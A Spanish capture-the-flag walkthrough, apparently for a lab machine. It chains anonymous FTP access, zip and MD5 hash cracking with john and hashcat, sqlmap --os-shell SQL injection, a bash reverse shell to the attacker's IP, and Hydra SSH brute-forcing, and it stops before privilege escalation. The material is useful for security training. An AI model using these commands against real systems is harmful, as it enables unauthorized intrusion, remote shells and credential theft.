En esta máquina empezaremos como siempre  haciendo un escaneo con nmap.
```bash
sudo nmap -p- --open -sC -sS -sV --min-rate 5000 -n -vvv -Pn 10.129.181.24 
```
Aquí  podemos observar los puertos `80-http`, `22-ssh` y `21-ftp`.
![[Pasted image 20250802183900.png]]

En esta máquina nos piden información sobre el puerto `21-FTP` así que vamos a explotar ese.
En este caso usaremos una contraseña por defecto como `anon123` o `anonymous123`, cualquiera sirve. 
![[Pasted image 20250802184951.png]]

Una vez tenemos el archivo backup.zip vemos que lo tenemos que descomprimir. Pero está protegido por una contraseña.

Para averiguar la contraseña usaremos la herramienta `John the Ripper`.
**Nota:** Para instalarlo usar el siguiente comando.
```shell
sudo apt install john
```

Bien, ahora primero averiguaremos el hash del archivo.
```bash
zip2john backup.zip > hashes
```

Esto creará un script con el hash de john que utilizaremos junto al diccionario `rockyou.txt` con el siguiente comando:
```bash
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```
**Nota:** Puede que tengamos que descomprimir el diccionario `rockyou.txt` con el comando `gunzip rockyou.txt.gz`

![[Pasted image 20250802191049.png]]

![[Pasted image 20250802191323.png]]
Introducimos la contraseña que habíamos sacado con john y nos da dos archivos `index.php` y `style.css`.

Si leemos los archivos podemos ver que en `index.php` nos da un usuario y una contraseña de administrador.
![[Pasted image 20250802191651.png]]
Pero claramente esta contraseña está hasheada.
Así que vamos a comprobar que tipo de hash es, para esto hay muchas opciones, tenemos varias webs pero en este caso seguiremos en la terminal usando `hashid`
![[Pasted image 20250802192149.png]]
Hay varias opciones así que probaremos por una de las más comunes que es `MD5`.
Lo primero meteremos el hash en un directorio `hash`.
```bash
echo '2cb42dgfjkgsdfgñlaskdfhfoqw2334nk' > hash
```

```bash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250802193013.png]]

Ahora introducimos las credenciales en la web.

![[Pasted image 20250802193235.png]]

![[Pasted image 20250802193858.png]]
Vemos que la web no tiene nada especial de por si, pero hay un catálogo, eso significa que habrá una base de datos asociada.

Podemos comprobarlo escribiendo en el navegador lo siguiente:
```browser
http://10.129.181.24/dashboard.php?search=any+query
```
Aunque no pasa nada.  Entonces vamos a probar con una inyección SQL.
Usaremos la herramienta `sqlmap` y, en mi caso, la herramienta `cookie-editor` en Firefox.

Para obtener la cookie es tan fácil como irse a las extensiones y darle a `cookie-editor` y ver la PHPSESSID y la cookie.

![[Pasted image 20250802201012.png]]

Para `sqlmap` usaremos los siguientes parámetros.
```bash
slqmap -u 'http://10.129.181.24' --cookie="PHPSESSID={la cookie que nos de} --os-shell
```

Con esto entraríamos al shell, pero es probable que sea bastante inestable. Así que vamos a estabilizar las TTY.
Primero abrimos un puerto de escucha en otra pestaña.
![[Pasted image 20250802201313.png]]
 Y en la shell que habíamos abierto abriremos el acceso para llevarlo a nuestro puerto de escucha.
```shell
bash -c "bash -i >& /dev/tcp/{nuestra IP}/443 0>&1"
``` 
Nos hará una pregunta y le daremos a `Enter` por defecto.
Y ya estaríamos dentro en nuestro puerto de escucha, ahora solo tenemos que habilitar correctamente la terminal.
![[Pasted image 20250802202420.png]]
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```shell
stty raw -echo fg
```

```shell
export TERM=xterm
```
(Opcional, pero recomendable también)
``` shell
export SHELL=bash
```

![[Pasted image 20250802210414.png]]

![[Pasted image 20250802210457.png]]![[Pasted image 20250802210458.png]]
Después de entrar y navegar por el shell, encontraremos la `flag` en el `user.txt`

Ahora viene lo que probablemente sea lo más complicado e importante. Subir los privilegios.

Para ello vamos a explotar el puerto `ssh`
Sabemos ya el usuario ``postgres`, pero no sabemos la contraseña ya que perdimos la conexión anterior.
![[Pasted image 20250802211309.png]]
Que se puede conseguir esta contraseña es usando Hydra.

```bash
hydra -l postgres -P /usr/share/wordlist/rockyou.txt ssh://10.129.181.24
```

Aquí quizás tengamos que esperar un poco... ya que no es una contraseña débil.

